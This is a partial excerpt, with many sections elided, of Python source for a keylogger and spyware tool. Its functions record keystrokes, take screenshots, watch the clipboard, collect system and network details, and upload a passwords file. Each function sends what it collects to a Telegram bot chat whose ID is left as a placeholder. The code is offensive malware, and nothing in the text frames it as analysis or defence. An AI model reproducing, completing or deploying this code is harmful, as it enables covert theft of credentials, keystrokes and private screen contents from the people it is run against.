...
async def capturar_teclas(bot):
    ...
    while True:
        ...
        if llista_teclas:
            try:
                await bot.send_message(chat_id="YOUR CHAT ID", text="\n".join(llista_teclas))
                llista_teclas.clear()
...
async def capture_screenshots(bot):
    while True:
        ...
        try:
            ...
            await bot.send_photo(chat_id="YOUR CHAT ID", photo=open(screenshot_path, 'rb'))
...
async def log_clipboard(bot):
    ...
    while True:
        ...
        if current_content != previous_content:
            ...
            await bot.send_message(chat_id="YOUR CHAT ID", text=f"Clipboard content: {current_content}") 

async def especificaciones_sistema(bot):
    await asyncio.sleep(0.001)
    especificaciones = obtener_especificaciones_sistema()
    await bot.send_message(chat_id="YOUR CHAT ID", text=f"{especificaciones}") 

async def informacion_red(bot):
    await asyncio.sleep(0.001)
    informacion_red = obtener_informacion_red()
    await bot.send_message(chat_id="YOUR CHAT ID", text=f"{informacion_red}")
...
async def passwords(bot):
    ...
    try:
        await bot.send_document(chat_id="YOUR CHAT ID", document=open(password_path, "rb"))
